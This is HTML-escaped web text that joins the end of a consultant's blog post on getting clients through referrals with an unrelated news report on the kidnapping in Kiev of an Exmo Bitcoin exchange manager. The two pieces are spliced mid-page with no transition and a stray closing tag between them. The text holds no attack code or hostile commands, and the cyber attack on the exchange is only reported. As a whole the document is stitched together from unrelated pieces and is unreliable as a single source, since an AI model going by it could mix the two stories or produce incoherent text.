&lt;p&gt;This approach results in fewer leads, but a significantly higher quality of each lead. That works perfectly for me because I’m not an agency and do not need more than a few projects at a time. Plus, because my clients are satisfied with my work they usually renew the contract (for an average of over 12 months!), so turnover is low and I only need one or two new clients per year to remain at capacity.&lt;/p&gt;
&lt;h2 id=&quot;things-i-dont-do&quot;&gt;Things I &lt;em&gt;Don’t&lt;/em&gt; Do&lt;/h2&gt;
&lt;p&gt;I find the following to be a poor use of time and effort for getting new consulting clients, especially now that I have a referral flywheel and because I look for quality of leads and not quantity. Your results may vary.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Networking Events&lt;/strong&gt; - All the networking events I’ve been to are full of people who are just starting out in something or are there to sell their professional services. Everyone else is too busy running their business to spend two hours exchanging business cards and listening to half-baked elevator pitches.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Participate in marketing or consulting communities&lt;/strong&gt; - I don’t sell to consultants or marketers, so I know I’m not going to find clients in these communities.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Partner with agencies or other consultants&lt;/strong&gt; - Whenever I used to chat with an agency owner, consultant, or freelancer, the topic of reciprocal referrals always comes up. It sounds great in theory—you refer clients to me and I refer clients to you. In practice, this never happens or I haven’t been satisfied with the quality of leads.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Hound people&lt;/strong&gt; - best projects are when both sides are invested and project is solving a critical challenge for the company. I follow up at most 3 times because emails get buried in inboxes, but after that I assume there’s no interest or no critical (“hair-on-fire”) problem they need solving.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Cold outreach&lt;/strong&gt; - There’s a very low likelihood of finding the right person at the right time, which means this will take a lot of effort to find a good lead let alone a client. Also, sending cold emails reeks of desperation and puts you in a weak position if you ever get to negotiate terms of the consulting engagement.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Advertising&lt;/strong&gt; - Why pay for leads when I don’t need to?&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Hand out business cards&lt;/strong&gt; - If I meet a prospective client or just someone I’d like to keep in touch with, I ask for their email or tell them mine. If one of us can’t be bothered to save an email address and follow up, then why pretend we care.&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;getting-consulting-clients-from-writing&quot;&gt;Getting Consulting Clients from Writing&lt;/h2&gt;
&lt;p&gt;Writing is still helpful but less for attracting new consulting leads and more for building trust and credibility with people who were already referred to me. The usual scenario is that someone is referred to me, they find my site to learn more about me. They’re mainly looking to answer two questions:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Can this consultant help me solve my problem?&lt;/li&gt;
&lt;li&gt;Will I like working with this consultant?&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;I write articles that are instructive and include examples from past projects so that a) I can help more people (more than I can help at any given time through consulting projects) and b) prospective clients see that I have experience with companies and challenges similar to theirs. So if their company and challenges are similar, then they know there’s a high likelihood that I’ll be able to solve their problem.&lt;/p&gt;
&lt;p&gt;To help prospective clients determine if they’ll like working with me, I project my working style and personality onto my site and my writing. For example, I value &lt;a href=&quot;https://www.gkogan.co/blog/clarity/&quot;&gt;clarity&lt;/a&gt; and &lt;a href=&quot;https://www.gkogan.co/blog/dont-design-emails/&quot;&gt;substance over fluff&lt;/a&gt;, so I keep my site simple and my writing to-the-point.&lt;/p&gt;
&lt;p&gt;I hope that reading about my process for getting new consulting clients helps you grow your own consulting business!&lt;/p&gt;
&lt;p&gt;If you have any questions send me an email or post them in the comments below.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;a href=&quot;https://news.ycombinator.com/item?id=16024507&quot;&gt;Discuss on Hacker News&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;◼&lt;/p&gt;
&lt;p&gt;PS - Liked this article? I write one every month or so, covering lessons learned on B2B startup growth. Don't miss the next one:&lt;/p&gt;

        &lt;/figure&gt;&lt;p class=&quot;story-body__introduction&quot;&gt;A manager of the Exmo Bitcoin exchange has been kidnapped in Ukraine.&lt;/p&gt;&lt;p&gt;According to Russian and Ukrainian media reports Pavel Lerner, 40, was kidnapped while leaving his office in Kiev's Obolon district on 26 December. &lt;/p&gt;&lt;p&gt;The reports said he was dragged into a black Mercedes-Benz by men wearing balaclavas.&lt;/p&gt;&lt;p&gt;Police in Kiev confirmed to the BBC that a man had been kidnapped on the day in question, but would not confirm his identity.&lt;/p&gt;&lt;p&gt;A spokeswoman said that the matter was currently under investigation, and that more information would be made public later on. &lt;/p&gt;&lt;p&gt;Mr Lerner is a prominent Russian blockchain expert and the news of his kidnapping has stunned many in the international cryptocurrency community. &lt;/p&gt;&lt;p&gt;Exmo described him as an analytics manager.&lt;/p&gt;&lt;p&gt;Blockchain is the technology that underpins the digital currency Bitcoin.&lt;/p&gt;&lt;p&gt;Exmo Finance is registered with Companies House in the UK, but has its main operations in Ukraine.&lt;/p&gt;&lt;p&gt;According to its website, it has 94,955 active users trading cryptocurrencies.&lt;/p&gt;&lt;p&gt;Separately, Exmo said in a tweet that it been the target of a cyber attack on Thursday.&lt;/p&gt;&lt;p&gt;Exmo spokesman Anatoliy Larin told the BBC: &quot;We are doing everything possible to speed up the search for Pavel Lerner. &lt;/p&gt;&lt;p&gt;&quot;Despite the situation the exchange is working as usual. We also want to stress that nature of Pavel's job at Exmo doesn't assume access either to storages or any personal data of users. All users' funds are absolutely safe.&quot; &lt;/p&gt;
